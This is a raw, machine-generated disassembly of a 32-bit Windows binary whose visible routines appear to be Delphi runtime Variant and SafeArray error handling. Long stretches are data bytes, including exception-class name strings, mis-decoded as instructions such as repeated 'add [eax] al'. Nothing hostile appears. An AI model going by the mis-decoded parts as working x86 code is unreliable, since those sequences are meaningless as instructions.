mov eax [ ebp + 0x14 ]
call sub_404944
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e28f
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40e2b8
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40e2e4
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40de54
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de84
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de84
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de90
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de9c
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dea8
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df14
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df80
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dfec
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e058
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e0c4
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e144
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e1b4
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40e224
mov eax r-xdata
call sub_40e2b8
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e5f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e615
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e61c
retn
sub_40e750
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x4c00407b
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
call r--data
add [ eax ] al
mov eax 0x4c00407b
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub cl ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x4c00407b
xor eax 0x35580040
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebx
popad
jb r-xdata
cld
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
adc eax 0x72615645
jns r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
outsb
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
rol ah 0xe8
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax - 0x18 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
pop esp
xor eax 0x35600040
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x4c00407b
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
jb r-xdata
out 0x40 eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x4c00407b
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
lea eax [ eax ]
cwde
out 0x40 eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e7 ] bl
add [ eax ] al
add [ eax + 0x4c00407b ] bh
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
0xc0040 0x0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
jpo r-xdata
jmp r-xdata
inc ebp
jb r-xdata
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
jb r-xdata
add [ eax + 0x35 ] bl
jb r-xdata
shl al 0xe9
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
jmp r--data
dec ecx
jmp r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0xc0040 ] cl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
mov eax 0x4c00407b
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ecx gs
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
mov ah 0x32
inc eax
add al dl
xor al [ eax ]
or al 0x33
outsd
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ ebx + ebp * 8 ] ah
inc eax
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x72615645 ] dl
outsb
je r-xdata
popad
outsb
je r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
insd
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
add [ eax ] al
jb r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ ebx + esi ] cl
outsb
js r-xdata
xor eax 0x32b40040
inc eax
add al dl
xor al [ eax ]
or al 0x33
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add al al
0x40 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
0xc0040 0x0
outsd
jb r-xdata
jbe r-xdata
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 8 + 0x40 ] dl
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ ebx + ebp * 8 + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ebx gs
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x4c00407b
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 + 0xc0040 ] cl
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
inc eax
add [ eax - 0x16 ] bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x16 ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x4c00407b
xor eax 0x35580040
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
dec esi
jne r-xdata
push 0x6f727245
jb r-xdata
retn
popad
outsb
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
dec esp
out 0x40 eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
in al dx
inc eax
outsd
jb r-xdata
outsd
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
jmp r-xdata
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0x4c00407b
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
outsd
push ebx
in eax dx
inc eax
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414440
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414440
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed5a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40413c
retn
call 0xffffffff8c253a61
mov ebx eax
xor eax eax
push ebp
push sub_40ed53
push [ fs : eax ]
insb
dec edi
jo r-xdata
rcl [ esp + ebp * 8 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ecc1
lea eax [ ebp - 0x4 ]
call sub_404118
retn
outsb
push ebp
jmp r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
add [ ebp + 0x5fe8fc45 ] cl
push esp
jb r-xdata
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add al dl
xor al [ eax ]
or al 0x33
sub_40eba8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_40ec70
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ecba
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ecc1
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40ecc4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ed53
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414440
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414440
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed5a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40413c
retn
sub_40ed60
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40edaa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40edb1
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40edb4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40edfe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee05
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40ee08
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ee97
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414440
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414440
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee9e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40413c
retn
sub_40eea4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eeee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eef5
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40eef8
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f13d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f144
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_40413c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
dec eax
je r-xdata
call sub_40ec70
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
jmp r-xdata
call sub_40ed60
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b584
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
jmp r-xdata
sub_40f158
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40ecc4
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40ee08
jmp r-xdata
jmp r-xdata
call sub_40eef8
sub_40f18c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40277c
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
call sub_40277c
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40f158
pop esi
pop ebx
retn
call sub_40277c
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40f158
jmp r-xdata
call sub_4027bc
mov edx eax
mov eax edx
call sub_403ad0
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40f158
jmp r-xdata
pop esi
pop ebx
retn
sub_40f210
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40f25a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f261
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_40f278
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f2a8
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f2a8
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f304
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40f14c
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40f14c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f278
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40f14c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40f14c
mov eax [ ebp - 0x318 ]
